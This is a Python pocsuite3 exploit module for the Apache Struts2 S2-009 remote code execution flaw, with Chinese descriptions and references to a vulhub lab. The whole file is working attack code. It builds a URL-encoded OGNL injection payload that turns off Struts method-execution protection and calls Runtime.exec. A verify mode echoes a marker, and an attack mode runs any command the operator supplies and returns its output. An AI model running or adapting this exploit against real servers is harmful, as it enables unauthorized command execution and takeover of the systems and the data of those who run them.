from collections import OrderedDict

from requests.exceptions import ReadTimeout
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, OptString


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1'
    appName = 'Struts2'
    appVersion = '2.1.0 - 2.3.1.1'
    name = 'Struts2-009远程代码执行'
    desc = '''Struts2-009远程代码执行'''
    pocDesc = '''Struts2-009远程代码执行'''
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    references = ['https://github.com/vulhub/vulhub/blob/master/struts2/s2-009/README.zh-cn.md',
                  'https://blog.csdn.net/fly_hps/article/details/85001659']
    samples = ['http://192.168.190.128:8080/ajax/example5?age=12313&name=']  # 测试样列,就是用 PoC 测试成功的网站

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = "echo VuLnEcHoPoCSuCCeSS"
        payload = "(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false)," \
                  "+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(" \
                  "%27RECOMMAND%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a)," \
                  "%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d)," \
                  "%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(" \
                  "%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)] "
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload
        flag = "VuLnEcHoPoCSuCCeSS"

        try:
            response = requests.get(url, headers=HEADERS, data=payload)
            if response and response.status_code == 200 and flag in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Postdata'] = payload
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = self.get_option("command")
        payload = "(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false)," \
                  "+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(" \
                  "%27RECOMMAND%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a)," \
                  "%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d)," \
                  "%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(" \
                  "%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)] "
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload

        try:
            response = requests.get(url, headers=HEADERS, data=payload)
            if response and response.status_code == 200:
                result['Stdout'] = response.text
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)


register_poc(DemoPOC)
